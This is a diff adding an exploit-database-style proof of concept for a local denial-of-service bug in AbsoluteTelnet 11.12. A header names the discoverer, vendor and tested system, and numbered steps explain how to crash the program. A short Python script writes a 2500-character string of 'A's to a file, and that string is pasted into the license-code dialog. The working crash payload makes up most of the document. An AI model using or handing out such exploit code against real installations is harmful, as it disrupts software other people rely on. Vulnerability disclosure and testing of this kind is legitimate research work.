@@ -1,0 +1,22 @@
+# Exploit Title: AbsoluteTelnet 11.12 - "license name" Denial of Service (PoC)
+# Discovery by: chuyreds
+# Discovery Date: 2020-02-05
+# Vendor Homepage: https://www.celestialsoftware.net/
+# Software Link : https://www.celestialsoftware.net/telnet/AbsoluteTelnet11.12.exe
+# Tested Version: 11.12
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 10 Pro x64 es
+
+#Steps to produce the crash:
+#1.- Run python code: AbsoluteTelent 11.12_license_code.py
+#2.- Open AbsoluteTelent_license_code.txt and copy content to clipboard
+#3.- Open AbsoluteTelnet.exe
+#4.- Select "Help" > "Enter License Key"
+#5.- In "License code" paste Clipboard
+#6.- Crashed
+
+cod = "\x41" * 2500
+
+f = open('AbsoluteTelent_license_code.txt', 'w')
+f.write(cod)
+f.close()
